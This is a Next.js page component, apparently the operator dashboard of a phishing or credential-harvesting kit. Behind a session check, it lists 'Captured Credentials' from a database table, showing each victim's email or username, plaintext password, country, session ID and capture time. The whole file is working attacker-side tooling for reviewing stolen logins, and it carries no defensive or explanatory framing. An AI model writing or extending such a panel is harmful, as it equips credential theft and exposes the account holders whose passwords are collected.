import { credentials } from "@/lib/schema";
import { mainDb } from "@/lib/db";
import { KeyRound, Mail, MapPin } from "lucide-react";
import { desc } from "drizzle-orm";
import { requireSession } from "@/lib/auth";

export const dynamic = "force-dynamic";

export default async function CredentialsPage() {
  await requireSession();
  // const credentials = mainDb.db.prepare(`
  //   SELECT * FROM credentials ORDER BY timestamp DESC
  // `).all();
  const credentialDetails = await mainDb
    .select()
    .from(credentials)
    .orderBy(desc(credentials.timestamp));

  return (
    <div className="flex-1 overflow-y-auto p-8">
      <div className="max-w-7xl mx-auto space-y-6">
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold tracking-tight text-white flex items-center gap-3">
              <KeyRound className="w-8 h-8 text-purple-500" />
              Captured Credentials
            </h1>
            <p className="text-gray-400 mt-2">Secure vault containing all captured authentication payloads.</p>
          </div>
          <div className="bg-[#111111] px-4 py-2 border border-[#222] rounded-lg">
            <span className="text-gray-400 text-sm">Total:</span>
            <span className="text-white ml-2 font-semibold">{credentialDetails.length}</span>
          </div>
        </div>

        <div className="bg-[#111111] border border-[#222] rounded-2xl overflow-hidden shadow-sm">
          <div className="overflow-x-auto">
            <table className="min-w-full divide-y divide-[#222]">
              <thead className="bg-[#161616]">
                <tr>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Email / Username</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Password</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Location</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Session ID</th>
                  <th className="px-6 py-4 text-left text-xs font-medium text-gray-400 uppercase tracking-wider">Timestamp</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#222]">
                {credentialDetails.map((cred: any, idx: number) => (
                  <tr key={`${cred.sessionId}-${idx}`} className="hover:bg-[#161616] transition-colors">
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-white font-medium">
                      <div className="flex items-center gap-2">
                        <Mail className="w-4 h-4 text-gray-500" />
                        {cred.email}
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300 font-mono">
                      <span className="bg-gray-800 px-2 py-1 rounded border border-gray-700">{cred.password}</span>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-300">
                      <div className="flex items-center gap-2">
                        <MapPin className="w-4 h-4 text-gray-500" />
                        {cred.country || "Unknown"}
                      </div>
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500 font-mono">
                      {cred.sessionId.slice(0, 8)}...
                    </td>
                    <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-400">
                      {new Date(cred.timestamp).toLocaleString()}
                    </td>
                  </tr>
                ))}
                {credentialDetails.length === 0 && (
                  <tr>
                    <td colSpan={5} className="px-6 py-12 text-center text-gray-500 text-sm">
                      <KeyRound className="w-8 h-8 text-gray-700 mx-auto mb-3" />
                      No credentials captured yet.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  );
}
